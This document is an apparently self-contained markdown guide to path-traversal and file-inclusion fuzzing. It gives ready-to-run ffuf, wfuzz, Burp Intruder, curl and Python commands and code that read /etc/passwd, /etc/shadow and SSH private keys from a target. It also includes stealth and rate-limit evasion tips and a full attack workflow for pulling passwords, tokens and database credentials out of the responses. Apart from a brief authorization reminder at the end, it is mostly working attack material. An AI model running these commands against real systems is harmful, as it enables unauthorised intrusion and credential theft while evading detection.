# Fuzzing Guide - Ready to Attack

This guide shows you how to use the payload files with popular fuzzing tools for maximum effectiveness.

## Quick Reference

**Files:**
- `FUZZING_PAYLOADS.txt` - 431 ready-to-use payloads
- `FUZZING_TARGETS.txt` - 154 common target files
- `Advanced_WAF_Bypass_Payloads.txt` - 2000+ categorized payloads
- `Aggressive_Testing_Payloads.txt` - 30 sections of attack patterns

---

## FFUF (Fast Web Fuzzer)

### Basic Single Parameter Fuzzing

```bash
# Simple fuzzing
ffuf -w FUZZING_PAYLOADS.txt -u https://target.com/api?file=FUZZ

# Match HTTP 200 responses
ffuf -w FUZZING_PAYLOADS.txt -u https://target.com/api?file=FUZZ -mc 200

# Filter out responses with specific size
ffuf -w FUZZING_PAYLOADS.txt -u https://target.com/api?file=FUZZ -mc 200 -fs 1234

# Match responses containing "root:"
ffuf -w FUZZING_PAYLOADS.txt -u https://target.com/api?file=FUZZ -mc 200 -mr "root:"

# Filter responses with specific words
ffuf -w FUZZING_PAYLOADS.txt -u https://target.com/api?file=FUZZ -mc 200 -fw "error,invalid"
```

### Multi-Position Fuzzing (Cluster Bomb Style)

```bash
# Fuzz traversal depth AND target file
ffuf -w depths.txt:DEPTH -w FUZZING_TARGETS.txt:TARGET \
     -u https://target.com/api?file=DEPTHTARGET -mc 200

# Create depths file on the fly
for i in {1..15}; do printf '../%.0s' $(seq 1 $i); done > depths.txt

# Then fuzz
ffuf -w depths.txt:DEPTH -w FUZZING_TARGETS.txt:TARGET \
     -u https://target.com/api?file=DEPTHTARGET -mc 200 -mr "root:|admin|password"
```

### POST Request Fuzzing

```bash
# POST with JSON
ffuf -w FUZZING_PAYLOADS.txt -u https://target.com/api \
     -X POST -H "Content-Type: application/json" \
     -d '{"file":"FUZZ"}' -mc 200

# POST with form data
ffuf -w FUZZING_PAYLOADS.txt -u https://target.com/api \
     -X POST -d "file=FUZZ" -mc 200
```

### Header Fuzzing

```bash
# Fuzz custom headers
ffuf -w FUZZING_PAYLOADS.txt \
     -u https://target.com/api \
     -H "X-Original-URL: FUZZ" -mc 200

# Multiple headers
ffuf -w FUZZING_PAYLOADS.txt \
     -u https://target.com/api \
     -H "X-Original-URL: FUZZ" \
     -H "X-Rewrite-URL: FUZZ" \
     -mc 200
```

### Advanced FFUF Options

```bash
# Rate limiting (10 requests per second)
ffuf -w FUZZING_PAYLOADS.txt -u https://target.com/api?file=FUZZ -rate 10

# Timeout and retries
ffuf -w FUZZING_PAYLOADS.txt -u https://target.com/api?file=FUZZ -timeout 10 -retry-attempts 3

# Save output
ffuf -w FUZZING_PAYLOADS.txt -u https://target.com/api?file=FUZZ \
     -mc 200 -o results.json -of json

# Use proxy (Burp)
ffuf -w FUZZING_PAYLOADS.txt -u https://target.com/api?file=FUZZ \
     -x http://127.0.0.1:8080

# Recursion
ffuf -w FUZZING_PAYLOADS.txt -u https://target.com/FUZZ -recursion -recursion-depth 2

# Threads
ffuf -w FUZZING_PAYLOADS.txt -u https://target.com/api?file=FUZZ -t 50
```

---

## WFUZZ

### Basic Fuzzing

```bash
# Simple fuzz
wfuzz -w FUZZING_PAYLOADS.txt https://target.com/api?file=FUZZ

# Hide responses with 404
wfuzz -w FUZZING_PAYLOADS.txt --hc 404 https://target.com/api?file=FUZZ

# Show only 200 responses
wfuzz -w FUZZING_PAYLOADS.txt --sc 200 https://target.com/api?file=FUZZ

# Filter by response size
wfuzz -w FUZZING_PAYLOADS.txt --hh 1234 https://target.com/api?file=FUZZ
```

### Multi-Position Fuzzing

```bash
# Two wordlists
wfuzz -w depths.txt -w FUZZING_TARGETS.txt \
      https://target.com/api?file=FUZZFUZ2Z

# Multiple parameters
wfuzz -w FUZZING_PAYLOADS.txt -w FUZZING_PAYLOADS.txt \
      https://target.com/api?file=FUZZ&path=FUZ2Z
```

### POST Requests

```bash
# POST data
wfuzz -w FUZZING_PAYLOADS.txt -d "file=FUZZ" \
      https://target.com/api

# JSON POST
wfuzz -w FUZZING_PAYLOADS.txt -H "Content-Type: application/json" \
      -d '{"file":"FUZZ"}' https://target.com/api
```

### Headers

```bash
# Custom headers
wfuzz -w FUZZING_PAYLOADS.txt -H "X-Original-URL: FUZZ" \
      https://target.com/api

# Cookie fuzzing
wfuzz -w FUZZING_PAYLOADS.txt -b "session=FUZZ" \
      https://target.com/api
```

---

## Burp Suite Intruder

### Setup

1. **Intercept request** in Burp Proxy
2. **Send to Intruder** (Ctrl+I)
3. **Clear all markers** (click "Clear §" button)
4. **Mark injection point**: Select parameter value, click "Add §"
5. **Load payloads**: Payloads tab → Load → `FUZZING_PAYLOADS.txt`

### Attack Types

**Sniper** (Single position, one payload at a time)
```
Request: GET /api?file=§PAYLOAD§
Uses: Test one parameter thoroughly
```

**Battering Ram** (Multiple positions, same payload)
```
Request: GET /api?file=§PAYLOAD§&path=§PAYLOAD§
Uses: Test when multiple params need same value
```

**Pitchfork** (Multiple positions, iterate together)
```
Request: GET /api?file=§PAYLOAD1§&path=§PAYLOAD2§
Payload Set 1: FUZZING_PAYLOADS.txt
Payload Set 2: FUZZING_TARGETS.txt
Uses: Test parameter combinations in parallel
```

**Cluster Bomb** (Multiple positions, all combinations)
```
Request: GET /api?file=§PAYLOAD1§&path=§PAYLOAD2§
Payload Set 1: depths.txt
Payload Set 2: FUZZING_TARGETS.txt
Uses: Test all possible combinations
```

### Payload Processing

**Encoding:**
- Add → URL-encode all characters
- Add → URL-encode key characters

**Prefix/Suffix:**
- Prefix: `../`
- Suffix: `%00`

**Match/Replace:**
- Match: `/`
- Replace: `%2f`

### Grep - Match

Add these patterns to catch successful exploits:
```
root:.*:0:0
admin
password
<?php
connection
[extensions]
define(
require
import
secret
token
api_key
```

### Options

- **Threads**: 10-50 (adjust based on target)
- **Throttle**: 1000ms delay (be stealthy)
- **Timeout**: 30 seconds
- **Retries**: 3

---

## Command-Line Fuzzing

### Using curl in bash

```bash
# Simple loop
while read payload; do
  response=$(curl -s "https://target.com/api?file=$payload")
  if echo "$response" | grep -q "root:"; then
    echo "[+] HIT: $payload"
    echo "$response" | head -20
  fi
done < FUZZING_PAYLOADS.txt
```

### Using xargs (parallel)

```bash
# Parallel processing
cat FUZZING_PAYLOADS.txt | xargs -P 10 -I {} \
  sh -c 'curl -s "https://target.com/api?file={}" | grep -q "root:" && echo "[+] {}"'
```

### Using GNU Parallel

```bash
# Install if needed
apt install parallel

# Parallel fuzzing
cat FUZZING_PAYLOADS.txt | parallel -j 50 \
  'curl -s "https://target.com/api?file={}" | grep -q "root:" && echo "[+] {}"'

# With progress bar
cat FUZZING_PAYLOADS.txt | parallel --bar -j 50 \
  'curl -s "https://target.com/api?file={}" | grep -q "root:" && echo "[+] {}"'

# Save all responses
cat FUZZING_PAYLOADS.txt | parallel -j 50 \
  'echo "=== {} ===" >> results.txt && curl -s "https://target.com/api?file={}" >> results.txt'
```

---

## Custom Python Fuzzer

### Quick Python Script

```python
#!/usr/bin/env python3
import requests
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed

def test_payload(url, param, payload):
    try:
        r = requests.get(url, params={param: payload}, timeout=5)

        # Success indicators
        if any(x in r.text.lower() for x in ['root:', 'admin', '<?php', 'password', 'connection']):
            return {
                'payload': payload,
                'status': r.status_code,
                'length': len(r.text),
                'found': True,
                'preview': r.text[:200]
            }
    except:
        pass
    return None

def main():
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <url> <parameter>")
        print(f"Example: {sys.argv[0]} https://target.com/api file")
        sys.exit(1)

    url = sys.argv[1]
    param = sys.argv[2]

    # Load payloads
    with open('FUZZING_PAYLOADS.txt', 'r') as f:
        payloads = [line.strip() for line in f if line.strip()]

    print(f"[*] Loaded {len(payloads)} payloads")
    print(f"[*] Target: {url}")
    print(f"[*] Parameter: {param}")
    print(f"[*] Starting fuzzing...\n")

    hits = 0
    with ThreadPoolExecutor(max_workers=20) as executor:
        futures = {executor.submit(test_payload, url, param, p): p for p in payloads}

        for i, future in enumerate(as_completed(futures), 1):
            result = future.result()
            if result:
                hits += 1
                print(f"[+] HIT #{hits}: {result['payload']}")
                print(f"    Status: {result['status']}, Length: {result['length']}")
                print(f"    Preview: {result['preview'][:100]}...")
                print()

            if i % 50 == 0:
                print(f"[*] Progress: {i}/{len(payloads)} ({i*100//len(payloads)}%)")

    print(f"\n[*] Fuzzing complete!")
    print(f"[*] Total hits: {hits}/{len(payloads)}")

if __name__ == '__main__':
    main()
```

Save as `quick_fuzzer.py` and run:
```bash
chmod +x quick_fuzzer.py
python3 quick_fuzzer.py https://target.com/api file
```

---

## Advanced Techniques

### 1. Depth-Based Fuzzing

Generate and test multiple traversal depths:

```bash
# Generate depth file
for depth in {1..20}; do
  for target in etc/passwd etc/shadow windows/win.ini; do
    echo "$(printf '../%.0s' $(seq 1 $depth))$target"
  done
done > depth_payloads.txt

# Fuzz with ffuf
ffuf -w depth_payloads.txt -u https://target.com/api?file=FUZZ -mc 200 -mr "root:|admin"
```

### 2. Encoding Variations

Generate encoded versions:

```bash
# URL encode
cat FUZZING_PAYLOADS.txt | while read line; do
  echo "$line" | jq -sRr @uri
done > encoded_payloads.txt

# Combine original + encoded
cat FUZZING_PAYLOADS.txt encoded_payloads.txt > combined.txt
```

### 3. Parameter Pollution Testing

```bash
# Test HPP
ffuf -w FUZZING_PAYLOADS.txt:P1 -w FUZZING_PAYLOADS.txt:P2 \
     -u "https://target.com/api?file=safe.txt&file=P1&file=P2" -mc 200
```

### 4. Header Injection Matrix

```bash
# Test multiple headers
for header in "X-Original-URL" "X-Rewrite-URL" "X-Custom-Path" "Referer"; do
  echo "[*] Testing header: $header"
  ffuf -w FUZZING_PAYLOADS.txt -u https://target.com/api \
       -H "$header: FUZZ" -mc 200 -mr "root:"
done
```

### 5. Recursive Discovery

```bash
# Once you find a working payload, enumerate further
WORKING_PAYLOAD="../../"

# Try common files
for file in etc/passwd etc/shadow windows/win.ini; do
  curl -s "https://target.com/api?file=${WORKING_PAYLOAD}${file}"
done
```

---

## Stealth Techniques

### 1. Rate Limiting

```bash
# Slow and steady
ffuf -w FUZZING_PAYLOADS.txt -u https://target.com/api?file=FUZZ -rate 1 -mc 200

# Random delays
while read payload; do
  curl -s "https://target.com/api?file=$payload"
  sleep $((1 + RANDOM % 5))
done < FUZZING_PAYLOADS.txt
```

### 2. User-Agent Rotation

```bash
# Random UA
ffuf -w FUZZING_PAYLOADS.txt -u https://target.com/api?file=FUZZ \
     -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

# Rotate UAs
while read payload; do
  UA=$(shuf -n1 user_agents.txt)
  curl -s -A "$UA" "https://target.com/api?file=$payload"
done < FUZZING_PAYLOADS.txt
```

### 3. Session Persistence

```bash
# Establish session first
curl -c cookies.txt https://target.com/login -d "user=test&pass=test"

# Use session for fuzzing
ffuf -w FUZZING_PAYLOADS.txt -u https://target.com/api?file=FUZZ \
     -b "session=SESSIONID" -mc 200
```

---

## Success Indicators

Look for these in responses:

### Linux Systems
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon
bin:x:2:2:bin
```

### Windows Systems
```
; for 16-bit app support
[fonts]
[extensions]
[files]
```

### PHP Files
```
<?php
define('DB_HOST'
$password =
$config =
```

### Config Files
```
password=
secret=
api_key=
token=
connection_string=
database_url=
```

### Error Messages
```
Warning: include()
Fatal error:
Parse error:
SQL syntax error
```

---

## One-Liners for Quick Testing

```bash
# Test top 10 payloads
head -10 FUZZING_PAYLOADS.txt | while read p; do curl -s "https://target.com/api?file=$p" | grep -q "root:" && echo "[+] $p"; done

# Quick scan all major targets
for target in etc/passwd etc/shadow windows/win.ini; do curl -s "https://target.com/api?file=../../$target"; done

# Test with all encodings
for enc in "" "%2e%2e%2f" "%252e%252e%252f" "%c0%ae%c0%ae%c0%af"; do curl -s "https://target.com/api?file=${enc}${enc}${enc}etc${enc}passwd"; done

# Parallel quick test
cat FUZZING_PAYLOADS.txt | parallel -j 50 'curl -s "https://target.com/api?file={}" | grep -q "root:" && echo "{}"'

# Find working depth
for i in {1..15}; do echo -n "Depth $i: "; curl -s "https://target.com/api?file=$(printf '../%.0s' $(seq 1 $i))etc/passwd" | grep -q "root:" && echo "FOUND" || echo "nope"; done
```

---

## Results Analysis

### Extract Sensitive Data

```bash
# Extract passwords from results
grep -Eo "[a-zA-Z0-9]+:[^:]+:[0-9]+:[0-9]+" results.txt

# Extract config values
grep -Eo "(password|api_key|secret|token).*=.*" results.txt

# Find database credentials
grep -i "db_host\|db_user\|db_pass\|database" results.txt
```

### Count Unique Findings

```bash
# Count successful payloads
grep "\[+\]" fuzzing.log | wc -l

# Unique files discovered
grep "\[+\]" fuzzing.log | cut -d: -f2 | sort -u | wc -l
```

---

## Troubleshooting

### No Results?

1. **Check connectivity**: `curl -v https://target.com`
2. **Try basic payload**: `curl "https://target.com/api?file=../../etc/passwd"`
3. **Check WAF**: Use `wafw00f https://target.com`
4. **Try different encoding**: Start with double encoding
5. **Change parameter name**: Try `path`, `page`, `file`, `doc`, `include`

### Too Many False Positives?

1. **Filter by size**: `ffuf -fs 1234,5678`
2. **Use regex match**: `ffuf -mr "root:.*:0:0"`
3. **Check status codes**: `ffuf -mc 200,301`
4. **Baseline first**: Test with known-bad payload, filter that size

### Rate Limited?

1. **Reduce speed**: `ffuf -rate 1`
2. **Add delays**: `ffuf -p 1-3`
3. **Use fewer threads**: `ffuf -t 1`
4. **Rotate IPs**: Use proxies or VPN

---

## Example Workflow

Complete attack workflow:

```bash
# 1. Quick reconnaissance
wafw00f https://target.com
whatweb https://target.com

# 2. Find injectable parameter
ffuf -w /usr/share/wordlists/dirb/common.txt \
     -u https://target.com/FUZZ -mc 200,301,302

# 3. Test basic payload
curl "https://target.com/api?file=../../etc/passwd"

# 4. If blocked, try encoding
curl "https://target.com/api?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd"

# 5. Full fuzzing scan
ffuf -w FUZZING_PAYLOADS.txt \
     -u https://target.com/api?file=FUZZ \
     -mc 200 -mr "root:" -o results.json

# 6. Extract findings
jq '.results[] | .input.FUZZ' results.json

# 7. Enumerate further
PAYLOAD=$(jq -r '.results[0].input.FUZZ' results.json)
for file in etc/shadow etc/group root/.ssh/id_rsa; do
  curl -s "https://target.com/api?file=$PAYLOAD" | sed "s/passwd/$file/"
done

# 8. Document and report
```

---

## Remember

- ✅ **Always have authorization**
- ✅ **Document everything**
- ✅ **Start slow, scale up**
- ✅ **Baseline before fuzzing**
- ✅ **Save all results**
- ❌ **Don't DoS the target**
- ❌ **Don't test prod without permission**
- ❌ **Don't ignore rate limits**

---

**Happy Fuzzing! 🎯**
